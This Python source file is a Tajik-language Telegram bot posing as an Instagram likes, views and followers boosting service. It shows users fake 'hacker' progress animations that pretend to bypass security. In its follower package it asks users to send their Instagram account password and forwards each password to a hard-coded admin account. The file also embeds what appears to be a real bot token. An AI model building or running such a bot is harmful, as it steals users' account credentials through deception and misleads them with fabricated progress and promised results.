import telebot
from telebot import types
import time
from datetime import datetime, timedelta
import random
import os

# Токени бот ва ID админ аз environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8594194469:AAGfdITXOmGFGiqZCfY4UUkxn5lgws9OZ7c")
ADMIN_ID = int(os.environ.get('ADMIN_ID', 6862331593))

bot = telebot.TeleBot(BOT_TOKEN)

# Захираи маълумот
user_last_request = {}
user_requests = {}  # Ҳамаи дарҳостҳои корбарон
pending_requests = []  # Дарҳостҳои интизор

def is_admin(user_id):
    """Санҷиш ки корбар админ аст ё не"""
    return user_id == ADMIN_ID

def check_time_limit(user_id):
    """Санҷиши он ки корбар метавонад дарҳост равон кунад"""
    if user_id not in user_last_request:
        return True, None
    
    last_time = user_last_request[user_id]
    time_diff = datetime.now() - last_time
    
    if time_diff < timedelta(hours=24):
        remaining = timedelta(hours=24) - time_diff
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        return False, f"⏰ Шумо аллакай дарҳост фиристодаед.\n\n⏳ Интизори {hours} соат ва {minutes} дақиқа"
    
    return True, None

def get_main_keyboard():
    """Клавиатураи асосӣ"""
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("📊 Лайкҳо ва боздидҳо")
    btn2 = types.KeyboardButton("📱 Сториҳо")
    btn3 = types.KeyboardButton("💬 Назарҳо")
    btn4 = types.KeyboardButton("👥 Обунашавӣ")
    keyboard.add(btn1, btn2, btn3, btn4)
    return keyboard

def get_admin_keyboard():
    """Клавиатураи махсуси админ"""
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("📋 Дарҳостҳои нав")
    btn2 = types.KeyboardButton("📊 Омори умумӣ")
    btn3 = types.KeyboardButton("👥 Рӯйхати корбарон")
    btn4 = types.KeyboardButton("📢 Паёми умумӣ")
    btn5 = types.KeyboardButton("🔙 Бозгашт ба меню")
    keyboard.add(btn1, btn2, btn3, btn4, btn5)
    return keyboard

def get_likes_views_keyboard():
    """Клавиатура барои лайкҳо ва боздидҳо"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("👁 Боздидҳо", callback_data="views")
    btn2 = types.InlineKeyboardButton("❤️ Лайкҳо", callback_data="likes")
    keyboard.add(btn1, btn2)
    return keyboard

def get_subscription_keyboard():
    """Клавиатура барои обунашавӣ"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("⚡️ 50/рӯз", callback_data="sub_50")
    btn2 = types.InlineKeyboardButton("🔥 15/24соат", callback_data="sub_15")
    keyboard.add(btn1, btn2)
    return keyboard

def advanced_hacker_animation(chat_id, duration=50):
    """Ҳаракати пешрафтаи "ҳакерӣ" бо рангҳо ва эффектҳо"""
    
    # Қисми 1: Санҷиши системаи амният
    frames_1 = [
        "🔍 Пайвастшавӣ ба сервер...\n[░░░░░░░░░░] 0%",
        "🔍 Пайвастшавӣ ба сервер...\n[██░░░░░░░░] 20%",
        "🔍 Пайвастшавӣ ба сервер...\n[████░░░░░░] 40%",
        "🔍 Пайвастшавӣ ба сервер...\n[██████░░░░] 60%",
        "🔍 Пайвастшавӣ ба сервер...\n[████████░░] 80%",
        "✅ Пайваст муваффақ!\n[██████████] 100%"
    ]
    
    msg = bot.send_message(chat_id, frames_1[0])
    for frame in frames_1[1:]:
        time.sleep(2)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(1.5)
    
    # Қисми 2: Шикастани рамз
    frames_2 = [
        "🔓 Шикастани системаи рамзгузорӣ...\n⚡️ Trying: 8a4f2b...",
        "🔓 Шикастани системаи рамзгузорӣ...\n⚡️ Trying: c3e9d1...",
        "🔓 Шикастани системаи рамзгузорӣ...\n⚡️ Trying: f7b2a8...",
        "🔓 Шикастани системаи рамзгузорӣ...\n⚡️ Trying: 2d5c9e...",
        "✅ Рамз шикаста шуд!\n🔑 Access granted"
    ]
    
    for frame in frames_2:
        time.sleep(2.5)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(1.5)
    
    # Қисми 3: Ҷустуҷӯи маълумот
    frames_3 = [
        "🔎 Скан кардани датабаза...\n📂 Files found: 1,247",
        "🔎 Ҷустуҷӯи профил...\n🎯 Searching database...",
        "🔎 Профил пайдо шуд!\n✨ User data located",
        "💾 Бор кардани маълумот...\n⏳ Loading: 33%",
        "💾 Бор кардани маълумот...\n⏳ Loading: 67%",
        "💾 Бор кардани маълумот...\n⏳ Loading: 100%"
    ]
    
    for frame in frames_3:
        time.sleep(2.8)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(1.5)
    
    # Қисми 4: Коркарди дарҳост
    frames_4 = [
        "🔄 Коркарди дарҳост...\n⚙️ Processing request...",
        "🔄 Дахолшавӣ ба сервер...\n🌐 Connecting to API...",
        "🔄 Фиристодани дарҳост...\n📤 Sending data...",
        "✅ Анҷом дода шуд!\n🎉 Request completed successfully!"
    ]
    
    for frame in frames_4:
        time.sleep(3)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(2)
    
    # Эффекти охирӣ
    final_messages = [
        "⚡️ СИСТЕМАИ ҲАКЕРӢ ⚡️",
        "🔥 КОРКАРД ТАМОМ ШУД 🔥",
        "✨ ДАРХОСТ ШУМО ҚАБУЛ КАРДА ШУД ✨"
    ]
    
    for final in final_messages:
        bot.edit_message_text(f"\n\n{final}\n\n", chat_id, msg.message_id)
        time.sleep(1)
    
    bot.delete_message(chat_id, msg.message_id)

def subscription_hacker_animation(chat_id):
    """Ҳаракати ҳакерӣ барои обунашавӣ (55 сония)"""
    
    frames_1 = [
        "🌐 Пайвастшавӣ ба шабакаи глобалӣ...\n[░░░░░░░░░░] 0%",
        "🌐 Пайвастшавӣ ба шабакаи глобалӣ...\n[███░░░░░░░] 30%",
        "🌐 Пайвастшавӣ ба шабакаи глобалӣ...\n[██████░░░░] 60%",
        "🌐 Пайвастшавӣ ба шабакаи глобалӣ...\n[█████████░] 90%",
        "✅ Пайваст барқарор шуд!\n[██████████] 100%"
    ]
    
    msg = bot.send_message(chat_id, frames_1[0])
    for frame in frames_1[1:]:
        time.sleep(2.5)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(2)
    
    frames_2 = [
        "🔐 Bypass security protocols...\n🛡 Level 1/5",
        "🔐 Bypass security protocols...\n🛡 Level 2/5",
        "🔐 Bypass security protocols...\n🛡 Level 3/5",
        "🔐 Bypass security protocols...\n🛡 Level 4/5",
        "🔐 Bypass security protocols...\n🛡 Level 5/5",
        "✅ Амният гузаронида шуд!\n🎯 All levels passed"
    ]
    
    for frame in frames_2:
        time.sleep(2.5)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(2)
    
    frames_3 = [
        "🔎 Санҷиши аккаунт...\n👤 Analyzing profile data",
        "🔎 Тафтиши боботҳо...\n📊 Checking followers count",
        "🔎 Таҳлили мухлисон...\n💡 Analyzing audience",
        "✅ Таҳлил тамом!\n📈 Ready for boost"
    ]
    
    for frame in frames_3:
        time.sleep(3)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(2)
    
    frames_4 = [
        "⚡️ Омодасозии системаи обунашавӣ...\n🚀 Preparing subscription system",
        "⚡️ Фаъолсозии ботҳо...\n🤖 Activating bot network",
        "⚡️ Танзими параметрҳо...\n⚙️ Configuring settings",
        "✅ Система омода!\n🎉 System ready for action"
    ]
    
    for frame in frames_4:
        time.sleep(3)
        bot.edit_message_text(frame, chat_id, msg.message_id)
    
    time.sleep(2)
    
    bot.edit_message_text("🔥 СИСТЕМАИ ОБУНАШАВӢ ФАЪОЛ ШУД! 🔥", chat_id, msg.message_id)
    time.sleep(1.5)
    bot.delete_message(chat_id, msg.message_id)

@bot.message_handler(commands=['start'])
def start_message(message):
    """Паёми ибтидоӣ"""
    user_id = message.from_user.id
    
    if is_admin(user_id):
        welcome_text = f"""
📱 ПАНЕЛИ АДМИН 📱

Салом {message.from_user.first_name}! 👋

Шумо ба панели админи hamadonivideo_ai ворид шудед.

Барои идораи бот аз кнопкаҳои зерин истифода баред:
"""
        bot.send_message(message.chat.id, welcome_text, reply_markup=get_admin_keyboard())
    else:
        welcome_text = f"""
🎬 ХУШ ОМАДЕД БА HAMADONIVIDEO_AI! 🎬

Салом {message.from_user.first_name}! 👋

Мо ба шумо пешниҳод мекунем:

📊 Лайкҳо ва боздидҳо - Зиёд кардани популярии видео
📱 Сториҳо - Промошни стория (незадик)
💬 Назарҳо - Илова кардани назарҳо (незадик)
👥 Обунашавӣ - Афзоиши обунашавон

⚡️ Ҳамаи хизматҳо бехатар ва босуръат!

Лутфан як амалро интихоб кунед:
"""
        bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    """Дастрасӣ ба панели админ"""
    if is_admin(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "📱 Шумо ба панели админ ворид шудед",
            reply_markup=get_admin_keyboard()
        )
    else:
        bot.send_message(message.chat.id, "❌ Шумо дастрасӣ надоред!")

@bot.message_handler(func=lambda message: message.text == "📋 Дарҳостҳои нав")
def show_pending_requests(message):
    """Намоиши дарҳостҳои интизор"""
    if not is_admin(message.from_user.id):
        return
    
    if not pending_requests:
        bot.send_message(message.chat.id, "📭 Дарҳостҳои нав нестанд")
        return
    
    text = "📋 ДАРХОСТҲОИ НАВ:\n\n"
    for i, req in enumerate(pending_requests[-10:], 1):
        text += f"{i}. {req['type']} - @{req['username']}\n"
        text += f"   ⏰ {req['time']}\n\n"
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda message: message.text == "📊 Омори умумӣ")
def show_statistics(message):
    """Намоиши омор"""
    if not is_admin(message.from_user.id):
        return
    
    total_users = len(user_requests)
    total_requests = sum(len(reqs) for reqs in user_requests.values())
    pending = len(pending_requests)
    
    today = datetime.now().date()
    today_requests = sum(1 for reqs in user_requests.values() 
                        for req in reqs if req['date'].date() == today)
    
    stats_text = f"""
📊 ОМОРИ УМУМӢ

👥 Корбарон: {total_users}
📝 Дарҳостҳои умумӣ: {total_requests}
⏳ Дар интизор: {pending}
📅 Имрӯз: {today_requests}

⏰ Санаи охирӣ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    bot.send_message(message.chat.id, stats_text)

@bot.message_handler(func=lambda message: message.text == "👥 Рӯйхати корбарон")
def show_users_list(message):
    """Намоиши рӯйхати корбарон"""
    if not is_admin(message.from_user.id):
        return
    
    if not user_requests:
        bot.send_message(message.chat.id, "👥 Ҳанӯз корбарон нестанд")
        return
    
    text = "👥 РӮЙХАТИ КОРБАРОН:\n\n"
    for i, (user_id, reqs) in enumerate(list(user_requests.items())[:20], 1):
        text += f"{i}. ID: {user_id}\n"
        text += f"   Дарҳостҳо: {len(reqs)}\n\n"
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda message: message.text == "📢 Паёми умумӣ")
def broadcast_prompt(message):
    """Фиристодани паёми умумӣ"""
    if not is_admin(message.from_user.id):
        return
    
    msg = bot.send_message(
        message.chat.id,
        "📢 Паёми умумиро нависед:"
    )
    bot.register_next_step_handler(msg, send_broadcast)

def send_broadcast(message):
    """Фиристодани паём ба ҳамаи корбарон"""
    if not is_admin(message.from_user.id):
        return
    
    text = message.text
    success = 0
    failed = 0
    
    status_msg = bot.send_message(message.chat.id, "📤 Фиристода истодааст...")
    
    for user_id in user_requests.keys():
        try:
            bot.send_message(user_id, f"📢 ПАЁМИ УМУМӢ:\n\n{text}")
            success += 1
        except:
            failed += 1
        time.sleep(0.1)
    
    bot.edit_message_text(
        f"✅ Анҷом!\n\n📊 Муваффақ: {success}\n❌ Ношиканд: {failed}",
        message.chat.id,
        status_msg.message_id
    )

@bot.message_handler(func=lambda message: message.text == "🔙 Бозгашт ба меню")
def back_to_menu(message):
    """Бозгашт ба менюи асосӣ"""
    start_message(message)

@bot.message_handler(func=lambda message: message.text == "📊 Лайкҳо ва боздидҳо")
def likes_views_menu(message):
    """Менюи лайкҳо ва боздидҳо"""
    bot.send_message(
        message.chat.id,
        "📊 Интихоб кунед, ки шумо чӣ мехоҳед:\n\n💡 Барои зиёд кардани популярии видео",
        reply_markup=get_likes_views_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "📱 Сториҳо")
def stories_menu(message):
    """Менюи сториҳо"""
    bot.send_message(
        message.chat.id,
        "⚠️ Ҳоло корҳои техникӣ рафта истодаанд.\n\n🔧 Хизмат незадик фаъол мешавад.\n\n⏰ Лутфан баъдтар кӯшиш кунед.",
        reply_markup=get_main_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "💬 Назарҳо")
def comments_menu(message):
    """Менюи назарҳо"""
    bot.send_message(
        message.chat.id,
        "⚠️ Ҳоло корҳои техникӣ рафта истодаанд.\n\n🔧 Хизмат незадик фаъол мешавад.\n\n⏰ Лутфан баъдтар кӯшиш кунед.",
        reply_markup=get_main_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "👥 Обунашавӣ")
def subscription_menu(message):
    """Менюи обунашавӣ"""
    bot.send_message(
        message.chat.id,
        "👥 ОБУНАШАВӢ\n\n📈 Афзоиши обунашавони аккаунти шумо\n\n💎 Пакети худро интихоб кунед:",
        reply_markup=get_subscription_keyboard()
    )

@bot.callback_query_handler(func=lambda call: call.data in ["views", "likes"])
def handle_views_likes(call):
    """Коркарди кнопкаҳои боздидҳо ва лайкҳо"""
    user_id = call.from_user.id
    
    can_request, error_msg = check_time_limit(user_id)
    
    if not can_request:
        bot.answer_callback_query(call.id, error_msg, show_alert=True)
        return
    
    action = "👁 Боздидҳо" if call.data == "views" else "❤️ Лайкҳо"
    
    msg = bot.send_message(
        call.message.chat.id,
        f"🔗 {action}\n\n🔎 Лутфан линки асосии видеои худро аз instagram равон кунед:\n\n💡 Мисол:\nhttps://instagram.com/video/********"
    )
    
    bot.register_next_step_handler(msg, process_link, action, user_id, call.from_user)

def process_link(message, action, user_id, user_info):
    """Коркарди линк аз корбар"""
    link = message.text
    
    if not link.startswith("http"):
        bot.send_message(
            message.chat.id,
            "❌ Линки нодуруст!\n\n🔗 Лутфан линки комилро равон кунед",
            reply_markup=get_main_keyboard()
        )
        return
    
    # Ҳаракати ҷазобии ҳакерӣ
    advanced_hacker_animation(message.chat.id)
    
    # Нигоҳ доштани вақти дарҳост
    user_last_request[user_id] = datetime.now()
    
    # Сабти дарҳост
    if user_id not in user_requests:
        user_requests[user_id] = []
    
    request_data = {
        'type': action,
        'link': link,
        'date': datetime.now(),
        'username': user_info.username or user_info.first_name,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    user_requests[user_id].append(request_data)
    pending_requests.append(request_data)
    
    # Паём ба корбар
    success_msg = f"""
✅ ДАРХОСТ ҚАБУЛ КАРДА ШУД!

🎯 Намуд: {action}
🔗 Линк: {link}

⏱ Дарҳости шумо дар навбат гузошта шуд
📊 Натиҷа дар муддати 2-6 соат кобари мешавад

💡 Дар як рӯз танҳо 1 дарҳост равона карда метавонед
⏰ Дарҳости навбатӣ баъди 24 соат имкон аст

🎉 Ташаккур барои истифода!
"""
    
    bot.send_message(message.chat.id, success_msg, reply_markup=get_main_keyboard())
    
    # Фиристодани маълумот ба админ
    admin_text = f"""
🔔 ДАРХОСТИ НАВ

━━━━━━━━━━━━━━━
👤 Корбар: {user_info.first_name}
🆔 ID: {user_id}
📱 Username: @{user_info.username if user_info.username else 'Надорад'}

━━━━━━━━━━━━━━━
📊 Намуд: {action}
🔗 Линк: {link}

━━━━━━━━━━━━━━━
⏰ Вақт: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📝 Ҳолат: Дар интизор

━━━━━━━━━━━━━━━
"""
    
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("✅ Қабул", callback_data=f"accept_{user_id}"))
    keyboard.add(types.InlineKeyboardButton("❌ Рад кардан", callback_data=f"reject_{user_id}"))
    
    bot.send_message(ADMIN_ID, admin_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "sub_50")
def handle_sub_50(call):
    """Коркарди пакети 50/рӯз"""
    bot.answer_callback_query(
        call.id,
        "⚠️ Ҳоло корҳои техникӣ рафта истодаанд.\n\n🔧 Пакет незадик фаъол мешавад.",
        show_alert=True
    )

@bot.callback_query_handler(func=lambda call: call.data == "sub_15")
def handle_sub_15(call):
    """Коркарди пакети 15/24соат"""
    user_id = call.from_user.id
    
    can_request, error_msg = check_time_limit(user_id)
    
    if not can_request:
        bot.answer_callback_query(call.id, error_msg, show_alert=True)
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "👥 ПАКЕТИ 15/24СОАТ\n\n🔗 Қадами 1/2\n🔎 Лутфан линки асосии аккаунти худро равон кунед:\n\n💡 Мисол:\nhttps://instagram/user/yourname"
    )
    
    bot.register_next_step_handler(msg, process_subscription_link, user_id, call.from_user)

def process_subscription_link(message, user_id, user_info):
    """Коркарди линки аккаунт барои обунашавӣ"""
    link = message.text
    
    if not link.startswith("http"):
        bot.send_message(
            message.chat.id,
            "❌ Линки нодуруст!\n\n🔗 Лутфан линки комилро равон кунед",
            reply_markup=get_main_keyboard()
        )
        return
    
    # Ҳаракати ҳакерии аввалӣ
    subscription_hacker_animation(message.chat.id)
    
    # Хоҳиши юзернейм
    msg = bot.send_message(
        message.chat.id,
        "👤 ПАКЕТИ 15/24СОАТ\n\n🔗 Қадами 2/2\n✏️ БОЯД БАРОИ ИДОМАИ ИН КОР МАН ПАРОЛИ АКАУНТИ ШУМОРО ДОШТА БОШАМ\n\n АКАУНТ ПАРОЛИ АКАУНТИ ХУДРО РАВОН КУНЕД ДАР ҲОЛАТИ ЯДОРИ МУШКИЛИ БА АДМИН ПАЁМ ДИҲЕД. :\n\n💡 Мисол: your_username"
    )
    
    bot.register_next_step_handler(msg, process_username, link, user_id, user_info)

def process_username(message, link, user_id, user_info):
    """Коркарди юзернейм аз корбар"""
    username = message.text
    
    # Нигоҳ доштани вақти дарҳост
    user_last_request[user_id] = datetime.now()
    
    # Сабти дарҳост
    if user_id not in user_requests:
        user_requests[user_id] = []
    
    request_data = {
        'type': '👥 Обунашавӣ 15/24соат',
        'link': link,
        'username': username,
        'date': datetime.now(),
        'user': user_info.username or user_info.first_name,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    user_requests[user_id].append(request_data)
    pending_requests.append(request_data)
    
    # Паём ба корбар
    success_msg = f"""
✅ ДАРХОСТ ҚАБУЛ КАРДА ШУД!

🎯 Пакет: 15 обунашавон/24 соат
🔗 Аккаунт: {link}
👤 паролӣ: @{username}

━━━━━━━━━━━━━━━
⏱ Дарҳости шумо дар навбат гузошта шуд
📊 Раванди обунашавӣ дар муддати 24 соат оғоз мешавад
⚡️ Натиҷа: +15 обунашавон

━━━━━━━━━━━━━━━
💡 Дар як рӯз танҳо 1 дарҳост равона карда метавонед
⏰ Дарҳости навбатӣ баъди 24 соат имкон аст

━━━━━━━━━━━━━━━
🎉 Ташаккур барои истифода!

ДАР ҲОЛАТИ ДИЛХОҲ МУШКИЛИ БА АДМИН ПАЁМ ДИҲЕД
"""
    
    bot.send_message(message.chat.id, success_msg, reply_markup=get_main_keyboard())
    
    # Фиристодани маълумот ба админ
    admin_text = f"""
🔔 ДАРХОСТИ НАВ - ОБУНАШАВӢ

━━━━━━━━━━━━━━━
👤 Корбар: {user_info.first_name}
🆔 ID: {user_id}
📱 Username: @{user_info.username if user_info.username else 'Надорад'}

━━━━━━━━━━━━━━━
📊 Пакет: 15 обунашавон/24 соат
🔗 Аккаунт: {link}
👤 ПАРОЛ: @{username}

━━━━━━━━━━━━━━━
⏰ Вақт: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📝 Ҳолат: Дар интизор

━━━━━━━━━━━━━━━
"""
    
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("✅ Қабул", callback_data=f"accept_{user_id}"))
    keyboard.add(types.InlineKeyboardButton("❌ Рад кардан", callback_data=f"reject_{user_id}"))
    
    bot.send_message(ADMIN_ID, admin_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("accept_"))
def accept_request(call):
    """Қабули дарҳост аз тарафи админ"""
    if not is_admin(call.from_user.id):
        return
    
    user_id = int(call.data.split("_")[1])
    
    try:
        bot.send_message(
            user_id,
            "✅ ХАБАРИ ХУШ!\n\n🎉 Дарҳости шумо аз тарафи админ қабул карда шуд!\n\n📊 Корҳо оғоз шуданд\n⏱ Натиҷаро интизор шавед"
        )
        
        bot.answer_callback_query(call.id, "✅ Дарҳост қабул карда шуд")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        bot.edit_message_text(
            call.message.text + "\n\n✅ ҚАБУЛ КАРДА ШУД",
            call.message.chat.id,
            call.message.message_id
        )
    except:
        bot.answer_callback_query(call.id, "❌ Хатогӣ рух дод")

@bot.callback_query_handler(func=lambda call: call.data.startswith("reject_"))
def reject_request(call):
    """Радди дарҳост аз тарафи админ"""
    if not is_admin(call.from_user.id):
        return
    
    user_id = int(call.data.split("_")[1])
    
    try:
        bot.send_message(
            user_id,
            "❌ ДАРХОСТ РАД КАРДА ШУД\n\n⚠️ Дарҳости шумо аз тарафи админ рад карда шуд\n\n📝 Сабабҳои эҳтимолӣ:\n- Линки нодуруст\n- Маълумоти нопурра\n- Шартҳо риоя нашуданд\n\n💡 Шумо метавонед дарҳости нав равон кунед"
        )
        
        # Бозгардонидани имкони дарҳост
        if user_id in user_last_request:
            del user_last_request[user_id]
        
        bot.answer_callback_query(call.id, "❌ Дарҳост рад карда шуд")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        bot.edit_message_text(
            call.message.text + "\n\n❌ РАД КАРДА ШУД",
            call.message.chat.id,
            call.message.message_id
        )
    except:
        bot.answer_callback_query(call.id, "❌ Хатогӣ рух дод")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Коркарди ҳамаи паёмҳои дигар"""
    bot.send_message(
        message.chat.id,
        "❓ Ман инро нафаҳмидам\n\n💡 Лутфан аз кнопкаҳои зерин истифода баред:",
        reply_markup=get_admin_keyboard() if is_admin(message.from_user.id) else get_main_keyboard()
    )

# Оғози бот
if __name__ == '__main__':
    print("🤖 Бот оғоз ёфт...")
    print(f"📅 Сана: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🔑 Токен: {BOT_TOKEN[:20]}...")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            print(f"❌ Хатогӣ: {e}")
            time.sleep(5)
